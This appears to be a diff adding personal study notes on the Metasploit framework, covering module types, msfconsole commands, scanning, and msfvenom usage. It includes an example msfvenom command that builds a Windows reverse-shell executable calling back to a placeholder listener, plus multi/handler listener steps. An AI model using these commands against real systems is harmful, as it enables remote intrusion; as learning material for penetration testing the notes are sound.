@@ -1,0 +1,139 @@
+Metasploit framework can be found at /usr/share/metasploit-framework
+    *modules perform specific tasks
+        -auxiliary  =   supporting modules
+                        (scanners, crawlers, fuzzers, etc.)
+        -encoders   =   encode exploit and payload
+                        (for signature based AV)
+        -evasion    =   direct attempt at evading AV software
+        -exploits   =   neatly organized by target system
+        -nops       =   No OPeration; buffer, consistent payload size
+        -payloads   =   code to run on target systems 
+            +singles [self contained]
+            +stagers [set up connection to target systems for use with
+                      larger payloads]
+            +stages [downloaded by the stager]
+        -Post       =   useful during post-exploitation
+
+msfconsole      -   starts the framework
+msfdb init      -   initialize Metasploit database [run in cmd line before msfconsole]
+                    (systemctl start postgresql - may be required before)
+
+Once the console has started we can use most shell commands
+(one important exception: no output redirection)
+
+sessions        -   show existing sessions
+sessions -i <#> -   interact with session number <#>
+
+db_status       -   Check the database status
+
+workspace       -   list available workspaces (* denotes active workspace)
+                    (workspaces are used to isolate different projects)
+                    (-h flag list available options for command)
+workspace <name> -  swith to workspace <name> 
+                    (-a flag adds a workspace; -d flag deletes a workspace)
+
+
+
+help            -   extensive help menu;
+help <command>  -   information on speciffied <command>
+
+history         -   lists previously ran commands
+
+use <exploit>   -   starts <exploit>, sets context
+
+back            -   leave context
+
+show options    -   print all options related to the current context
+show            -   print available parameters 
+
+show <parameter>-   print context related information for <parameter>
+
+info           -    further information for current context
+info <module_path>- further info for specified <module_path>
+
+search <string> -   search framework database for relevant modules
+                    [<string> can be CVE, exploit name, target sys] 
+                    [item in first column can be utilized w/ use]
+
+search type:<module> <string>   - sets <module> type to search
+
+search portscan                 -   list potential portscanning modules
+
+set <parameter> <value>     -   set <parameter> to <value> or overide previous <value>
+    *common parameters:
+        -RHOST  =   Remote host - target IP/IP-range; can also be file (one host per line)
+        -RPORT  =   Remote port - target port
+        -PAYLOAD =  payload to be used with the exploit
+        -LHOST  =   Local host - 
+        -LPORT  =   Local port -
+        -SESSION =  each connection established using Metasploit has a session ID
+
+unset <parameter>           -     clear value for <parameter>
+
+setg <parameter> <value>    -  set global <value> for <parameter>
+
+unsetg <parameter>          -    clear global value for <parameter>
+
+exploit     -   run the exploit [add a -z flag to set to background
+run         -   alias for the exploit command
+
+check       -   check if a system is vulnerable without exploiting it
+                (only available on some modules)
+
+background  -   send current session to background and return to msfconsole
+                [also can use Ctrl+Z]
+
+
+portscaning modules options:
+    *CONCURRENCY    -   Number of targets to be scanned simultaneously
+    *PORTS          -   Port range to be scanned
+    *RHOSTS         -   Target system or target network to be scanned
+    *THREADS        -   Number of threads to be used simultaneously
+
+portscanning:
+    *You can also perform nmap scans directly from the msfconsole
+    *db_nmap        - save results to database
+        -hosts      - see available hosts (has a -h help option)
+                     (-R option adds value from database to RHOSTS parameter
+        -services   - see available services (has a -h help option)
+    *scanner/discovery/udp_sweep - module to quickly identify services running over UDP
+
+_____________________________
+
+
+msfvenom -l payloads    -   access all payloads available in metasploit framework
+
+msfvenom --list formats -   list supported output formats
+         --list payloads-   list all available payloads
+                            [pipe to grep to search]
+         -e             -   encode
+         -f             -   format
+         -o             -   output location & filename for payload 
+
+msfvenom -p <payload> <options>     -   standard syntax
+    [ex: msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listener_ip> LPORT=<port_number>]
+
+msfvenom payload names:
+    <OS>/<architecture>/<payload>
+    [architecture is skipped for Windows 32bit targets]
+                        payload itself separared with _ for stageless
+                                                  and / for staged
+                                [windows/x64/meterpreter_reverse_tcp
+                                 windows/x64/meterpreter/reverse_tcp]
+
+_____________________________
+OTHER:
+    *msfconsole
+    *use multi/handler
+    *options
+    *set PAYLOAD <payload>
+    *set LHOST <listen-address>
+    *set LPORT <listen-port>
+    *exploit -j
+    *sessions 
+        [see active sessions]
+    *sessions <number>
+_____________________________
+
+Ctrl+Z  -   send to background [Does not work as intended]
+Ctrl+C  -   abort
